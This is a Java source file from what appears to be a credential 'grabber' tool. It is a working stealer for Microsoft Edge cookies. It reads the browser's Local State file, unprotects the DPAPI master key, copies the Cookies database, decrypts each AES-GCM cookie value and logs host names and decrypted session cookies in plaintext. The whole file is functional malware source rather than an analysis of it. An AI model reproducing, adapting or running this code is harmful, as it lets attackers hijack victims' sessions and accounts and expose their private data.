package ninja.maki.grabber.edge;

import com.sun.jna.platform.win32.Crypt32Util;
import ninja.maki.utils.Logger;
import ninja.maki.utils.SystemUtil;
import org.apache.commons.codec.binary.Base64;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.Arrays;

public class EdgeCookie {
    public static void grab() {
        Logger.log("Edge Cookie", Logger.Type.INFO);
        String cookieTemp = System.getProperty("java.io.tmpdir") + "edgecookie.tmp";
        String cookiePath = System.getProperty("user.home") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies";
        File cookieTempFile = new File(cookieTemp);
        try {
            cookieTempFile = File.createTempFile("edgecookie", ".tmp");
            cookieTemp = cookieTempFile.getAbsolutePath();
        }catch (IOException e){
            Logger.log("Failed to create temp file.", Logger.Type.INFO);
        }
        File cookiePathFile = new File(cookiePath);
        if(cookiePathFile.exists()) {
            try {
                String cookieState = System.getProperty("user.home") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State";
                File cookieStateFile = new File(cookieState);
                StringBuilder cryptMasterKey = new StringBuilder();
                try (BufferedReader reader = new BufferedReader(new FileReader(cookieStateFile))) {
                    String tempString;
                    while ((tempString = reader.readLine()) != null) {
                        cryptMasterKey.append(tempString);
                    }
                } catch (IOException e) {
                    Logger.log("Failed to read file \"" + cookieState + "\".", Logger.Type.ERROR);
                }
                cryptMasterKey = new StringBuilder(SystemUtil.getSubString(cryptMasterKey.toString(), "\"encrypted_key\":\"", "\""));
                byte[] masterKey = Base64.decodeBase64(cryptMasterKey.toString());
                if (new String(masterKey).startsWith("DPAPI")) {
                    Logger.log("Get Encrypted Key.", Logger.Type.INFO);
                } else {
                    throw new Exception("Failed to get Encrypted Key.");
                }
                masterKey = Crypt32Util.cryptUnprotectData(Arrays.copyOfRange(masterKey, "DPAPI".length(), masterKey.length));
                if (masterKey.length != 256 / 8) throw new Exception("Failed to decrypt key.");
                try {
                    SystemUtil.copyFile(cookiePathFile, cookieTempFile);
                    Logger.log("Copy \"" + cookiePath + "\" to \"" + cookieTemp + "\".", Logger.Type.INFO);
                } catch (IOException e) {
                    Logger.log("Failed to copy \"" + cookiePath + "\" to \"" + cookieTemp + "\".", Logger.Type.ERROR);
                }
                Connection connection;
                Statement statement;
                try {
                    Class.forName("org.sqlite.JDBC");
                    connection = DriverManager.getConnection("jdbc:sqlite:" + cookieTemp);
                    connection.setAutoCommit(false);
                    Logger.log("Connect database \"" + cookieTemp + "\".", Logger.Type.INFO);
                    statement = connection.createStatement();
                    ResultSet resultSet = statement.executeQuery("SELECT host_key, name,encrypted_value FROM cookies");
                    Logger.log("", Logger.Type.INFO);
                    Logger.log("==================================================================", Logger.Type.INFO);
                    while (resultSet.next()) {
                        String hostKey = resultSet.getString("host_key");
                        String name = resultSet.getString("name");
                        String cryptPassword = resultSet.getString("encrypted_value");
                        InputStream inputStream = resultSet.getBinaryStream("encrypted_value");
                        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                        int ch;
                        while ((ch = inputStream.read()) != -1) {
                            byteArrayOutputStream.write(ch);
                        }
                        byte[] cookieByte = byteArrayOutputStream.toByteArray();
                        byteArrayOutputStream.close();
                        String cookie;
                        if (cryptPassword.startsWith("v10")) {
                            byte[] nonce = Arrays.copyOfRange(cookieByte, "v10".length(), "v10".length() + 96 / 8);
                            cookieByte = Arrays.copyOfRange(cookieByte, "v10".length() + 96 / 8, cookieByte.length);
                            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                            SecretKeySpec keySpec = new SecretKeySpec(masterKey, "AES");
                            GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(16 * 8, nonce);
                            cipher.init(Cipher.DECRYPT_MODE, keySpec, gcmParameterSpec);
                            cookie = new String(cipher.doFinal(cookieByte));
                        } else {
                            cookie = new String(Crypt32Util.cryptUnprotectData(cookieByte), StandardCharsets.UTF_8);
                        }
                        Logger.log("", Logger.Type.INFO);
                        Logger.log("Host Key -> " + hostKey, Logger.Type.INFO);
                        Logger.log(name + " -> " + cookie, Logger.Type.INFO);
                    }
                    Logger.log("", Logger.Type.INFO);
                    Logger.log("==================================================================", Logger.Type.INFO);
                    resultSet.close();
                    statement.close();
                    connection.close();
                } catch (Exception e) {
                    Logger.log("Failed to get info.", Logger.Type.ERROR);
                }
            }catch (Exception e) {
                Logger.log(e.getMessage(), Logger.Type.ERROR);
            }
        }else {
            Logger.log("\"" + cookiePath + "\" is not founded.", Logger.Type.ERROR);
        }
        Logger.log("", Logger.Type.INFO);
        if(cookieTempFile.exists()) {
            if(!cookieTempFile.delete()) {
                Logger.log("Failed to delete \"" + cookieTemp + "\".", Logger.Type.ERROR);
            }
        }
    }
}
